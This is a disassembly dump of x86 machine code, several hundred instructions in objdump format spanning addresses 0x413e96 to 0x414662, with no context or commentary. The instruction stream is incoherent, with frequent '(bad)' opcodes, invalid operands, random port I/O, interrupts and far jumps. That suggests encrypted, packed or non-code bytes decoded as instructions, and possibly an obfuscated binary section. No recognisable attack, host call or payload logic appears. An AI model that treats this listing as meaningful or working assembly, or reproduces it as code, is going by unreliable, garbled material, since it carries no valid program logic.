  413e96:	or     al,BYTE PTR [esi-0x6e]
  413e99:	pop    ecx
  413e9a:	popa   
  413e9b:	int    0x90
  413e9d:	pusha  
  413e9e:	pop    ebp
  413e9f:	mov    DWORD PTR ds:0xe0616610,esi
  413ea5:	or     dl,BYTE PTR [ebx]
  413ea7:	pushf  
  413ea8:	rcl    DWORD PTR [eax+0x4e],0x75
  413eac:	out    0x73,al
  413eae:	or     eax,DWORD PTR [eax+ebx*1+0x6db019cb]
  413eb5:	sbb    ebp,eax
  413eb7:	adc    BYTE PTR [ebx+0x1eec99e1],bl
  413ebd:	xchg   ecx,eax
  413ebe:	ret    0x239f
  413ec1:	add    ecx,DWORD PTR ds:[edx+0x65]
  413ec5:	mov    eax,0x50275f90
  413eca:	push   0xffffffec
  413ecc:	jnp    0x413f09
  413ece:	jmp    0x413e98
  413ed0:	mov    ebx,DWORD PTR [edx+0x1c03e726]
  413ed6:	sub    esp,ecx
  413ed8:	jl     0x413f22
  413eda:	sub    bh,BYTE PTR [esi+0x77c98855]
  413ee0:	and    cl,BYTE PTR [esi]
  413ee2:	(bad)  [edx-0x7]
  413ee5:	arpl   WORD PTR [ecx],di
  413ee7:	mov    eax,0x5f32102f
  413eec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413eed:	sub    dh,bl
  413eef:	mov    al,ds:0x6f7a3f04
  413ef4:	mov    esi,0x87a4a6a4
  413ef9:	and    DWORD PTR [ebx],ebx
  413efb:	std    
  413efc:	repz add bh,BYTE PTR [ebx+eiz*4]
  413f00:	sbb    eax,0xf3b6d060
  413f05:	inc    ebp
  413f06:	mov    DWORD PTR [ebx],esi
  413f08:	stc    
  413f09:	sbb    eax,0xb2c7e80d
  413f0e:	inc    ebx
  413f0f:	ins    DWORD PTR es:[edi],dx
  413f10:	xor    ecx,esi
  413f12:	mov    esp,0xc354425a
  413f17:	xchg   esp,eax
  413f18:	jno    0x413f67
  413f1a:	pop    ebx
  413f1b:	sub    cl,BYTE PTR [ebp+esi*1+0xa]
  413f1f:	add    al,0xc6
  413f21:	inc    ecx
  413f22:	inc    esp
  413f23:	sbb    al,0x53
  413f25:	adc    DWORD PTR [eax-0x73c9c3],eax
  413f2b:	mov    dh,0x70
  413f2d:	mov    ch,0xc1
  413f2f:	fldcw  WORD PTR [ebx]
  413f31:	xchg   BYTE PTR [eax+eax*1],dh
  413f34:	inc    edi
  413f35:	cli    
  413f36:	sar    ch,cl
  413f38:	lods   eax,DWORD PTR ds:[esi]
  413f39:	fcmovbe st,st(1)
  413f3b:	jb     0x413ebf
  413f3d:	inc    edx
  413f3e:	fstp   QWORD PTR [eax]
  413f40:	adc    DWORD PTR [ebx+esi*8+0x1e31b9f7],esi
  413f47:	jns    0x413f95
  413f49:	mov    dl,0xab
  413f4b:	pusha  
  413f4c:	sub    esi,ebx
  413f4e:	or     eax,0x467e7ca1
  413f53:	hlt    
  413f54:	int    0x35
  413f56:	sub    DWORD PTR [eax+0x1e6da852],ecx
  413f5c:	pop    esp
  413f5d:	int3   
  413f5e:	stc    
  413f5f:	cdq    
  413f60:	or     DWORD PTR [ebp+0x169de4f0],0x697f88f9
  413f6a:	inc    ecx
  413f6b:	pop    ss
  413f6c:	sbb    edx,DWORD PTR [ebx+esi*2-0x40]
  413f70:	ror    ebp,1
  413f72:	mov    ecx,0x4ceb9d95
  413f77:	mov    al,0x8e
  413f79:	jmp    0x9b827032
  413f7e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413f7f:	in     al,0x90
  413f81:	scas   eax,DWORD PTR es:[edi]
  413f82:	loopne 0x413fce
  413f84:	mov    DWORD PTR [eax],ebx
  413f86:	sub    esp,DWORD PTR [esi+0x44]
  413f89:	mov    BYTE PTR [edi+0x1568f134],0xc4
  413f90:	or     BYTE PTR [ecx],bl
  413f92:	aaa    
  413f93:	jge    0x414010
  413f95:	mov    bh,0xb8
  413f97:	ins    BYTE PTR es:[edi],dx
  413f98:	dec    ecx
  413f99:	pop    ds
  413f9a:	pushf  
  413f9b:	or     BYTE PTR [ebx+0x15],ah
  413f9e:	jg     0x413fd5
  413fa0:	adc    ecx,DWORD PTR [ecx+0x173749b7]
  413fa6:	inc    ecx
  413fa7:	mov    cl,0x98
  413fa9:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  413fab:	mov    ah,0xdf
  413fad:	mov    al,ds:0xc20fd459
  413fb2:	jns    0x41402a
  413fb4:	scas   eax,DWORD PTR es:[edi]
  413fb5:	inc    ebx
  413fb6:	sub    eax,0xfbfd8b87
  413fbb:	lahf   
  413fbc:	xlat   BYTE PTR ds:[ebx]
  413fbd:	mov    eax,ds:0x2594ca58
  413fc2:	dec    ebp
  413fc3:	xor    BYTE PTR [esi-0x745d7efd],bh
  413fc9:	fldcw  WORD PTR [esi+0x1e]
  413fcc:	jp     0x413fbc
  413fce:	mov    esp,0xab7e22d7
  413fd3:	pop    es
  413fd4:	outs   dx,DWORD PTR ds:[esi]
  413fd5:	and    BYTE PTR [edi+0x31],cl
  413fd8:	cs ret 0x7416
  413fdc:	xor    edi,ebp
  413fde:	aaa    
  413fdf:	dec    esp
  413fe0:	lock pop ebp
  413fe2:	inc    esi
  413fe3:	cdq    
  413fe4:	mov    bh,0x5c
  413fe6:	lea    eax,[edx]
  413fe8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413fe9:	jae    0x414021
  413feb:	sub    al,0x3e
  413fed:	and    BYTE PTR [edi],0x1f
  413ff0:	xchg   BYTE PTR [ebp+0x73f3bb99],al
  413ff6:	repnz sub cl,dl
  413ff9:	sub    al,0xc3
  413ffb:	add    BYTE PTR [ecx-0x7cfa7886],0x5a
  414002:	(bad)  
  414003:	pop    ebx
  414004:	ds xchg edi,eax
  414006:	inc    eax
  414007:	jle    0x414016
  414009:	iret   
  41400a:	out    0x37,al
  41400c:	int    0x5d
  41400e:	adc    ebx,DWORD PTR [eax+0x4a9aa0f8]
  414014:	mov    ds,WORD PTR [eax-0x7]
  414017:	jg     0x414037
  414019:	(bad)
  41401c:	jbe    0x414087
  41401e:	lods   eax,DWORD PTR ds:[esi]
  41401f:	xchg   ax,ax
  414021:	scas   al,BYTE PTR es:[edi]
  414022:	cmp    DWORD PTR [eax],ebx
  414024:	popa   
  414025:	fs push 0x5c
  414028:	and    eax,0xf83ce06f
  41402d:	fild   QWORD PTR [eax]
  41402f:	js     0x414046
  414031:	idiv   BYTE PTR [ecx-0x5e]
  414034:	cmp    ch,bl
  414036:	xor    eax,0x4b179f6a
  41403b:	loop   0x414038
  41403d:	adc    dl,BYTE PTR [ebx]
  41403f:	popf   
  414040:	cmp    DWORD PTR [ecx+0x44],ebp
  414043:	xchg   bh,bl
  414045:	xchg   BYTE PTR [edi+0x79],bl
  414048:	push   eax
  414049:	(bad)  
  41404b:	dec    ebx
  41404c:	inc    esi
  41404d:	cmp    BYTE PTR [esp+edi*4],al
  414050:	ss jb  0x414090
  414053:	hlt    
  414054:	sub    bh,BYTE PTR [ecx-0x53d9dafa]
  41405a:	add    dh,BYTE PTR [ecx+0x189442fe]
  414060:	(bad)  
  414061:	and    al,0x7d
  414063:	inc    esp
  414064:	retf   
  414065:	and    DWORD PTR [edi+0x19af76f1],0x0
  41406c:	int    0x36
  41406e:	add    DWORD PTR [ebp-0x61a4c062],esi
  414074:	int    0xa1
  414076:	sub    al,0x20
  414078:	ror    DWORD PTR [esp+esi*1-0xa],0x46
  41407d:	or     DWORD PTR fs:[edx],edx
  414080:	cs dec ecx
  414082:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414083:	in     al,dx
  414084:	leave  
  414085:	add    edx,DWORD PTR [edi+0x1a]
  414088:	xchg   ebp,eax
  414089:	xchg   esi,eax
  41408a:	pop    edi
  41408b:	fwait
  41408c:	jo     0x414081
  41408e:	jle    0x4140a8
  414090:	jnp    0x414054
  414092:	cmp    ebp,ebp
  414094:	es fisub DWORD PTR ss:[ebp-0x6f1d1c47]
  41409c:	ret    
  41409d:	and    ch,BYTE PTR [ebp+0x6e]
  4140a0:	iret   
  4140a1:	push   0xf8fdf1a0
  4140a6:	sub    eax,DWORD PTR [edi+0x71]
  4140a9:	jns    0x414129
  4140ab:	jae    0x4140b6
  4140ad:	mov    esp,ebx
  4140af:	inc    ebp
  4140b0:	sub    eax,0x1944adcc
  4140b5:	icebp  
  4140b6:	fsubr  QWORD PTR [esi-0x71318444]
  4140bc:	sbb    ebx,DWORD PTR ds:0x16e354f1
  4140c2:	push   cs
  4140c3:	and    eax,0xdd7a3ec7
  4140c8:	mov    bh,0xec
  4140ca:	inc    ecx
  4140cb:	aas    
  4140cc:	mov    cl,0x39
  4140ce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4140cf:	mov    ?,WORD PTR [ebp-0x71]
  4140d2:	mov    edi,0x9f5ff99a
  4140d7:	mov    bl,0xda
  4140d9:	imul   ebx,DWORD PTR [esi],0xffffffb7
  4140dc:	pop    ds
  4140dd:	adc    eax,DWORD PTR [edx]
  4140df:	test   BYTE PTR [ecx],ah
  4140e1:	(bad)  
  4140e2:	data16 imul BYTE PTR [edi+0x1486d093]
  4140e9:	and    ecx,ebx
  4140eb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4140ec:	xchg   esp,eax
  4140ed:	(bad)  
  4140ee:	fidiv  DWORD PTR [ecx*4+0x2bd5810e]
  4140f5:	jo     0x414141
  4140f7:	push   eax
  4140f8:	pcmpeqw mm1,QWORD PTR [edi+0x26bc7608]
  4140ff:	dec    DWORD PTR [esi-0x74]
  414102:	xchg   ebx,eax
  414103:	mov    ah,0x8
  414105:	(bad)  [edi+0x7d]
  414108:	test   eax,0xd3e369a7
  41410d:	aad    0x2a
  41410f:	cdq    
  414110:	rcr    BYTE PTR [ebx-0x15],1
  414113:	int3   
  414114:	loop   0x4140bc
  414116:	sbb    cl,BYTE PTR [edi]
  414118:	push   0x788bbd4e
  41411d:	retf   0x355
  414120:	outs   dx,DWORD PTR ds:[esi]
  414121:	jo     0x414185
  414123:	imul   esp,esp,0x8686f78a
  414129:	test   al,0x28
  41412b:	push   edi
  41412c:	into   
  41412d:	pop    ecx
  41412e:	xor    DWORD PTR [ebp+0x6f93df3e],ebp
  414134:	adc    eax,0x5372fc06
  414139:	test   al,0x46
  41413b:	faddp  st(4),st
  41413d:	sahf   
  41413e:	ror    DWORD PTR [esi+0x342de873],cl
  414144:	mov    ebp,0x8ccc4e5f
  414149:	(bad)  
  41414a:	jp     0x414133
  41414c:	or     bh,0x12
  41414f:	xchg   esp,eax
  414150:	add    bl,BYTE PTR [edx+0x773488c9]
  414156:	jp     0x41413f
  414158:	(bad)  
  414159:	mov    al,0x5d
  41415b:	sbb    eax,0xee22a4d9
  414160:	and    DWORD PTR [ecx],edi
  414162:	repnz mov dh,0xee
  414165:	inc    eax
  414166:	pop    ebx
  414167:	aam    0x50
  414169:	sbb    cl,BYTE PTR [ebx+ebp*2+0x2a16c874]
  414170:	mov    db5,ecx
  414173:	mov    dl,cl
  414175:	jg     0x414152
  414177:	push   esi
  414178:	cmp    al,0xfc
  41417a:	test   al,0x76
  41417c:	test   al,0xb4
  41417e:	(bad)  
  41417f:	in     eax,dx
  414180:	ret    0x465
  414183:	add    eax,0xdc658d4f
  414188:	sti    
  414189:	mov    ch,0x4f
  41418b:	das    
  41418c:	xchg   esi,eax
  41418d:	addr16 jmp 0x4141d9
  414190:	es jmp 0xd90f:0x98a3e290
  414198:	cdq    
  414199:	fldenv [ecx]
  41419b:	iret   
  41419c:	mov    edi,0x20e4507c
  4141a1:	(bad)  
  4141a2:	div    BYTE PTR [ebx-0x63]
  4141a5:	fsubr  QWORD PTR [edx-0x32]
  4141a8:	sbb    edx,esi
  4141aa:	(bad)  
  4141ab:	test   al,0x2
  4141ad:	pop    ebx
  4141ae:	bound  ebp,QWORD PTR [eax+0x25]
  4141b1:	sub    bh,ah
  4141b3:	cmp    ah,ch
  4141b5:	cmp    BYTE PTR [edi-0x3745c867],al
  4141bb:	pop    ss
  4141bc:	hlt    
  4141bd:	ret    
  4141be:	adc    BYTE PTR [esi],cl
  4141c0:	xchg   edx,eax
  4141c1:	push   ebx
  4141c2:	int    0x38
  4141c4:	loope  0x41420d
  4141c6:	inc    esi
  4141c7:	xor    dh,bl
  4141c9:	in     eax,dx
  4141ca:	clc    
  4141cb:	retf   
  4141cc:	xor    BYTE PTR [edi+0x27],al
  4141cf:	dec    esp
  4141d0:	inc    ebp
  4141d1:	arpl   WORD PTR [ebp-0x53b1348a],di
  4141d7:	sub    al,BYTE PTR [edi]
  4141d9:	sub    eax,0x3d77e602
  4141de:	jmp    0x414170
  4141e0:	push   ds
  4141e1:	add    DWORD PTR [ecx],esp
  4141e3:	jmp    0x41425e
  4141e5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4141e6:	mov    al,ds:0xd684ef3c
  4141eb:	(bad)  
  4141ed:	sub    bh,al
  4141ef:	into   
  4141f0:	iret   
  4141f1:	jnp    0x4141d4
  4141f3:	imul   edi,DWORD PTR [ebx+0x2e],0x2d
  4141f7:	xchg   esi,eax
  4141f8:	mov    bl,0x74
  4141fa:	dec    edi
  4141fb:	retf   0xc0e5
  4141fe:	and    al,0xec
  414200:	pop    ss
  414201:	mov    ah,0x5d
  414203:	push   esp
  414204:	mov    edi,0xa46f61bb
  414209:	popa   
  41420a:	xchg   esi,eax
  41420b:	dec    esp
  41420c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41420d:	dec    ecx
  41420e:	add    al,0xb1
  414210:	imul   edi,DWORD PTR [edx+ecx*1+0x29],0xffffffdf
  414215:	dec    esi
  414216:	lahf   
  414217:	lahf   
  414218:	sub    DWORD PTR [esp+eax*1-0x5ed021d0],ebx
  41421f:	test   DWORD PTR ds:0xebbaeb14,0x90ee760
  414229:	mov    ebp,DWORD PTR [ebx+0x52]
  41422c:	stos   BYTE PTR es:[edi],al
  41422d:	(bad)  
  41422e:	aad    0x46
  414230:	stos   BYTE PTR es:[edi],al
  414231:	(bad)  
  414232:	sbb    bl,BYTE PTR [eax-0x76]
  414235:	cwde   
  414236:	jmp    FWORD PTR [ebx+0xab4f7ca]
  41423c:	or     eax,0x69438744
  414241:	out    dx,al
  414242:	ja     0x41423a
  414244:	sbb    DWORD PTR [edx+eiz*1-0x12],0x39bba5d6
  41424c:	cmp    bh,BYTE PTR [eax]
  41424e:	cdq    
  41424f:	iret   
  414250:	pop    esp
  414251:	xor    esp,DWORD PTR [eax+0x5c]
  414254:	or     BYTE PTR [edx-0x4ea5bc7],0x8a
  41425b:	lods   al,BYTE PTR ds:[esi]
  41425c:	xor    BYTE PTR [ecx-0x6f5e1cd7],ah
  414262:	xchg   ebx,eax
  414263:	pop    edx
  414264:	test   al,0xbd
  414266:	lds    esi,FWORD PTR [edi+0x4d8802fd]
  41426c:	xor    dh,BYTE PTR [edx+0x2b]
  41426f:	mov    eax,ds:0x9224a11
  414274:	lds    ebp,FWORD PTR [edi]
  414276:	cmp    eax,0xfd00e84f
  41427b:	sbb    eax,0x7192a1b1
  414280:	shl    esp,0x76
  414283:	push   edx
  414284:	pop    ebp
  414285:	fnstcw WORD PTR [eax-0x3d]
  414288:	inc    ecx
  414289:	pusha  
  41428a:	call   0xfeba:0x11881c85
  414291:	icebp  
  414292:	fs xchg ebp,eax
  414294:	push   ss
  414295:	mov    dh,0x5e
  414297:	mov    ebp,ebp
  414299:	out    dx,eax
  41429a:	shl    ebp,0x1c
  41429d:	scas   al,BYTE PTR es:[edi]
  41429e:	icebp  
  41429f:	mov    al,ds:0xe11fe7fc
  4142a4:	push   esp
  4142a5:	cli    
  4142a6:	push   0xffffff91
  4142a8:	call   0x79640a1
  4142ad:	jmp    0x3733ef12
  4142b2:	gs out dx,al
  4142b4:	inc    ecx
  4142b5:	out    dx,eax
  4142b6:	xlat   BYTE PTR ds:[ebx]
  4142b7:	mov    esi,0x3f8a32e1
  4142bc:	sbb    BYTE PTR [esi-0x1e],0xf9
  4142c0:	out    dx,eax
  4142c1:	xlat   BYTE PTR ds:[ebx]
  4142c2:	mov    WORD PTR [esi-0x5be112ae],ss
  4142c8:	cld    
  4142c9:	stos   DWORD PTR es:[edi],eax
  4142ca:	add    bl,BYTE PTR [bp+di]
  4142cd:	mov    BYTE PTR [eax+0x33],cl
  4142d0:	jg     0x4142eb
  4142d2:	sbb    DWORD PTR [edx+edi*1],edi
  4142d5:	mov    ah,0x75
  4142d7:	cs (bad) 
  4142d9:	and    esi,edx
  4142db:	repz fdiv DWORD PTR [edx-0x27]
  4142df:	je     0x4142c6
  4142e1:	scas   eax,DWORD PTR es:[edi]
  4142e2:	aas    
  4142e3:	gs mov bh,0xf5
  4142e6:	cmp    ebp,DWORD PTR [ebx]
  4142e8:	rcl    DWORD PTR [eax+0x59691897],0x6
  4142ef:	stos   DWORD PTR es:[edi],eax
  4142f0:	adc    esp,ebp
  4142f2:	nop
  4142f3:	stos   DWORD PTR es:[edi],eax
  4142f4:	inc    ebx
  4142f5:	pusha  
  4142f6:	mov    eax,ds:0xcf08882c
  4142fb:	icebp  
  4142fc:	jmp    0xc501:0x9003e93d
  414303:	and    BYTE PTR [edx-0x5f],ch
  414306:	sbb    al,0x29
  414308:	popf   
  414309:	push   ss
  41430a:	sbb    BYTE PTR [esi],ch
  41430c:	adc    eax,0xac9302c2
  414311:	jmp    0x4142f7
  414313:	loop   0x4142f3
  414315:	add    al,0x67
  414317:	sub    al,0x80
  414319:	rcr    dh,cl
  41431b:	add    ebp,DWORD PTR [edi+eiz*8]
  41431e:	sahf   
  41431f:	push   0x37
  414321:	jp     0x41432c
  414323:	enter  0x49f6,0xe4
  414327:	scas   al,BYTE PTR es:[edi]
  414328:	xor    BYTE PTR [ebx],al
  41432a:	sahf   
  41432b:	mov    eax,ds:0x59d53047
  414330:	call   0xfd8f:0xf6586e5a
  414337:	scas   al,BYTE PTR es:[edi]
  414338:	xchg   edx,eax
  414339:	fisttp WORD PTR [ebx-0x50]
  41433c:	jns    0x414363
  41433e:	aad    0xcd
  414340:	dec    eax
  414341:	mov    WORD PTR [edi+esi*8],ss
  414344:	lahf   
  414345:	sti    
  414346:	cdq    
  414347:	xor    edx,edi
  414349:	gs ins DWORD PTR es:[edi],dx
  41434b:	sbb    BYTE PTR [ecx-0x21aa9afb],cl
  414351:	outs   dx,DWORD PTR ds:[esi]
  414352:	mov    ecx,0x35d0d133
  414357:	icebp  
  414358:	icebp  
  414359:	repnz cli 
  41435b:	sub    eax,0xd32ca0e4
  414360:	mov    bh,0x9f
  414362:	mov    ah,0xea
  414364:	cmp    BYTE PTR [esi-0x449e4644],ah
  41436a:	fs ffree st(7)
  41436d:	sub    cl,dl
  41436f:	(bad)  
  414370:	fs out 0xa8,eax
  414373:	jnp    0x4143a4
  414375:	and    BYTE PTR [ecx],ah
  414377:	out    0xa,eax
  414379:	outs   dx,DWORD PTR ds:[esi]
  41437a:	jecxz  0x4143d8
  41437c:	sbb    al,BYTE PTR [edi-0x11]
  41437f:	into   
  414380:	cs pop edx
  414382:	fmul   st(1),st
  414384:	outs   dx,BYTE PTR ds:[esi]
  414385:	cmp    esi,DWORD PTR [edi]
  414387:	mov    al,ds:0x45a36556
  41438c:	adc    al,BYTE PTR [esi+0x4a4c1a6f]
  414392:	xor    eax,0xf55994eb
  414397:	enter  0xbc6f,0x88
  41439b:	inc    ecx
  41439c:	mov    al,ds:0x8a4c2416
  4143a1:	sahf   
  4143a2:	aaa    
  4143a3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4143a4:	jl     0x4143ac
  4143a6:	out    0x44,eax
  4143a8:	pop    ecx
  4143a9:	not    BYTE PTR ds:0xa5ae1495
  4143af:	xor    edx,DWORD PTR [edi+0x35]
  4143b2:	daa    
  4143b3:	sub    BYTE PTR fs:[ebx-0x5b],0xba
  4143b8:	sahf   
  4143b9:	in     al,dx
  4143ba:	xchg   esp,eax
  4143bb:	sbb    BYTE PTR [esi+0x48],ah
  4143be:	into   
  4143bf:	inc    edx
  4143c0:	sub    bl,BYTE PTR [edi+0x44]
  4143c3:	gs jae 0x4143f8
  4143c6:	mov    ebx,0x29581e0f
  4143cb:	leave  
  4143cc:	xor    eax,0xa433c1c5
  4143d1:	push   ebp
  4143d2:	jl     0x4143f7
  4143d4:	push   0xa75a6d52
  4143d9:	int    0x20
  4143db:	inc    ecx
  4143dc:	ficomp DWORD PTR [edx+eiz*8]
  4143df:	fidivr DWORD PTR [ebx+0x6d55edb7]
  4143e5:	into   
  4143e6:	stos   BYTE PTR es:[edi],al
  4143e7:	bound  eax,QWORD PTR [eax]
  4143e9:	xchg   BYTE PTR [ebx+ecx*4],bl
  4143ec:	adc    ebp,esi
  4143ee:	sbb    ah,cl
  4143f0:	imul   DWORD PTR [ecx]
  4143f2:	add    eax,0x544ccba8
  4143f7:	mov    esi,0x33984f42
  4143fc:	bound  esp,QWORD PTR [edx+edx*1-0x44]
  414400:	int3   
  414401:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414402:	lea    edi,[esi+0x63]
  414405:	sub    DWORD PTR [esi-0x56],edi
  414408:	repz mov ss,WORD PTR ds:0x9d287a01
  41440f:	outs   dx,DWORD PTR ds:[esi]
  414410:	in     eax,0x39
  414412:	jne    0x414487
  414414:	lds    edi,FWORD PTR [edx+esi*8-0x73f8fb5b]
  41441b:	dec    ebp
  41441c:	dec    edi
  41441d:	retf   0x3598
  414420:	adc    al,0x8
  414422:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414423:	out    dx,al
  414424:	adc    DWORD PTR [esp+eax*2+0x21641389],0x1808a506
  41442f:	lock cmc 
  414431:	dec    edx
  414432:	out    dx,al
  414433:	jnp    0x414488
  414435:	int3   
  414436:	ror    ah,0x41
  414439:	clc    
  41443a:	data16 stos BYTE PTR es:[edi],al
  41443c:	int    0xcd
  41443e:	sbb    DWORD PTR [ecx-0x54],ebx
  414441:	mov    dl,0x32
  414443:	repnz dec esi
  414445:	or     al,0x16
  414447:	xor    al,BYTE PTR [edi]
  414449:	(bad)  
  41444a:	and    eax,0x3cc5feb2
  41444f:	dec    ebp
  414450:	and    al,0x80
  414452:	popa   
  414453:	ja     0x4143f8
  414455:	aas    
  414456:	ds xor eax,0x46b845ba
  41445c:	sub    eax,0x18abc061
  414461:	sbb    DWORD PTR [edi-0xaa853aa],eax
  414467:	outs   dx,DWORD PTR ds:[esi]
  414468:	in     eax,0xd1
  41446a:	test   eax,0x3aa572ed
  41446f:	fcomp  DWORD PTR [eax]
  414471:	mov    dl,0x73
  414473:	in     eax,0xfd
  414475:	jmp    0x414472
  414477:	pusha  
  414478:	sbb    BYTE PTR [esi],ah
  41447a:	cld    
  41447b:	mov    ds:0x10354794,al
  414480:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414481:	or     DWORD PTR [esi],esi
  414483:	mov    ebx,0x4250e2cf
  414488:	std    
  414489:	mov    ebx,0xa5d05aca
  41448e:	dec    ebp
  41448f:	mov    edi,0xbfb093fe
  414494:	(bad)  
  414496:	outs   dx,DWORD PTR ds:[esi]
  414497:	pop    edi
  414498:	jne    0x414499
  41449a:	push   0x56
  41449c:	jae    0x4144c9
  41449e:	pop    ds
  41449f:	jo     0x414463
  4144a1:	adc    cl,ah
  4144a3:	test   BYTE PTR [ebx+0x7a],bh
  4144a6:	and    al,0xa
  4144a8:	movups xmm1,XMMWORD PTR [eax+0x248f5d28]
  4144af:	shr    bh,1
  4144b1:	cmc    
  4144b2:	push   esi
  4144b3:	lea    edi,[ebx]
  4144b5:	rcl    DWORD PTR [ecx+0x117fa7e8],1
  4144bb:	jns    0x414456
  4144bd:	sbb    DWORD PTR [ebx-0x222f50ae],ecx
  4144c3:	sub    al,0x10
  4144c5:	mov    ebx,0x325e2f53
  4144ca:	mov    eax,ds:0x8fa8b430
  4144cf:	adc    eax,0x7fa40616
  4144d4:	push   bp
  4144d6:	jl     0x414487
  4144d8:	xor    ebp,DWORD PTR [edi]
  4144da:	sbb    bh,dl
  4144dc:	int3   
  4144dd:	fwait
  4144de:	stos   DWORD PTR es:[edi],eax
  4144df:	sub    BYTE PTR [esi+0x7445ee79],dh
  4144e5:	inc    edx
  4144e6:	jae    0x4144b3
  4144e8:	add    BYTE PTR [edi+0x4b],dh
  4144eb:	int3   
  4144ec:	push   ecx
  4144ed:	pop    ds
  4144ee:	mov    ch,0x55
  4144f0:	(bad)  
  4144f1:	iret   
  4144f2:	cmc    
  4144f3:	ds cli 
  4144f5:	adc    BYTE PTR [esi-0xc9016ca],cl
  4144fb:	mov    ah,ch
  4144fd:	fcmovnu st,st(2)
  4144ff:	xchg   esi,eax
  414500:	jns    0x4144ca
  414502:	ret    0x7630
  414505:	mov    al,0x51
  414507:	sbb    eax,0x2a9baff1
  41450c:	es cdq 
  41450e:	shl    DWORD PTR [ebp-0x351f8654],cl
  414514:	jbe    0x41450a
  414516:	data16 out 0x76,al
  414519:	sbb    al,0x56
  41451b:	pusha  
  41451c:	and    BYTE PTR [edi],ch
  41451e:	scas   eax,DWORD PTR es:[edi]
  41451f:	adc    al,0x7c
  414521:	pop    DWORD PTR [esi-0x7de52d49]
  414527:	sub    BYTE PTR [ebp-0x2ba55d7f],0xcb
  41452e:	and    eax,eax
  414530:	rcr    dh,1
  414532:	fucomip st,st(0)
  414534:	jb     0x4144bd
  414536:	cmp    bh,bh
  414538:	cmp    al,0x19
  41453a:	call   0x602c:0x4a904cf7
  414541:	test   DWORD PTR [edx-0x504bd677],0x54a2b14d
  41454b:	jp     0x414541
  41454d:	xchg   esi,eax
  41454e:	(bad)  
  41454f:	xor    cl,BYTE PTR [ebx+0x42435acc]
  414555:	dec    edx
  414556:	push   0x12
  414558:	pop    ebx
  414559:	pop    ecx
  41455a:	mov    dl,0xd8
  41455c:	rcl    DWORD PTR [ebx+0x1f],0xc7
  414560:	lea    edx,[edi+edx*8]
  414563:	jmp    0x41453d
  414565:	addr16 add ax,0x9910
  41456a:	mov    ss,WORD PTR [eax+0x11]
  41456d:	push   ss
  41456e:	or     BYTE PTR [ebx+eiz*2],dl
  414571:	test   DWORD PTR [esp+ebp*1],eax
  414574:	mov    edx,0x96b3939a
  414579:	adc    eax,0x9559dd3a
  41457e:	(bad)  
  414580:	scas   al,BYTE PTR es:[edi]
  414581:	push   0x16019eef
  414586:	push   cs
  414587:	xor    ebp,DWORD PTR fs:0xbe08c86a
  41458e:	dec    esp
  41458f:	in     eax,0x1e
  414591:	push   0x3d
  414593:	or     ebp,DWORD PTR [edx]
  414595:	lock mov cl,0x7a
  414598:	lods   eax,DWORD PTR ds:[esi]
  414599:	sub    eax,0xff17b631
  41459e:	push   ds
  41459f:	out    dx,eax
  4145a0:	or     eax,0x924e74c1
  4145a5:	cmp    esi,eax
  4145a7:	or     edx,edx
  4145a9:	mov    ebx,0x5120de97
  4145ae:	xor    edx,edx
  4145b0:	dec    ebp
  4145b1:	aad    0x3f
  4145b3:	sub    al,BYTE PTR [esi+0x6b]
  4145b6:	and    ecx,esi
  4145b8:	or     al,0xaa
  4145ba:	lods   al,BYTE PTR ds:[esi]
  4145bb:	ss dec edx
  4145bd:	imul   edi,DWORD PTR [esi],0x20
  4145c0:	inc    eax
  4145c1:	inc    ecx
  4145c2:	pop    esp
  4145c3:	add    BYTE PTR [esi+ebp*1-0x60d05fe2],cl
  4145ca:	or     DWORD PTR [edx-0x7a],0xffffffad
  4145ce:	ret    0x5859
  4145d1:	adc    dl,BYTE PTR [edx+0x1f8b1dbb]
  4145d7:	pushf  
  4145d8:	das    
  4145d9:	xor    esp,DWORD PTR [edx+ebp*4+0x2eef23f7]
  4145e0:	xchg   ebx,eax
  4145e1:	pop    esi
  4145e2:	xor    cl,ch
  4145e4:	jl     0x4145d8
  4145e6:	sbb    ebp,DWORD PTR [esp+esi*4+0x7f4ca750]
  4145ed:	jge    0x4145db
  4145ef:	in     eax,0x67
  4145f1:	pop    ds
  4145f2:	(bad)  
  4145f3:	mov    cl,0x26
  4145f5:	imul   ah
  4145f7:	(bad)  
  4145f8:	imul   ebp,DWORD PTR [ebx-0x12],0xb246ffe3
  4145ff:	mov    ?,WORD PTR [esi+0x11]
  414602:	in     eax,dx
  414603:	pop    eax
  414604:	and    ecx,0xffffffc3
  414607:	mov    ds:0xabf9fc3d,eax
  41460c:	rcr    dl,cl
  41460e:	add    al,0x24
  414610:	clc    
  414611:	mov    cl,0x7f
  414613:	into   
  414614:	ins    DWORD PTR es:[edi],dx
  414615:	sub    BYTE PTR [ebp-0x16],dl
  414618:	mov    bh,BYTE PTR [eax-0x66]
  41461b:	push   edx
  41461c:	pop    ebx
  41461d:	adc    BYTE PTR [ecx],bl
  41461f:	and    ebp,eax
  414621:	out    dx,eax
  414622:	and    eax,0x89c0f486
  414627:	pop    eax
  414628:	in     eax,dx
  414629:	ins    BYTE PTR es:[edi],dx
  41462a:	es and al,0x2e
  41462d:	fwait
  41462e:	daa    
  41462f:	popa   
  414630:	inc    ebp
  414631:	data16 jno 0x414625
  414634:	adc    esi,0x6969e8c3
  41463a:	sub    ah,BYTE PTR [ecx-0x2b]
  41463d:	sub    al,0x83
  41463f:	push   esp
  414640:	sbb    bh,bl
  414642:	ror    DWORD PTR [edi+0x3156a7e0],0x1e
  414649:	(bad)  
  41464a:	mov    ecx,0x30487f59
  41464f:	sub    eax,0xbdeaaf39
  414654:	mov    dh,0x3
  414656:	pop    ds
  414657:	jne    0x4145f0
  414659:	fsub   DWORD PTR fs:[ebx+ebp*4+0x39f75b17]
  414661:	pop    ecx
  414662:	imul   esp,ebx,0xe40fe35b
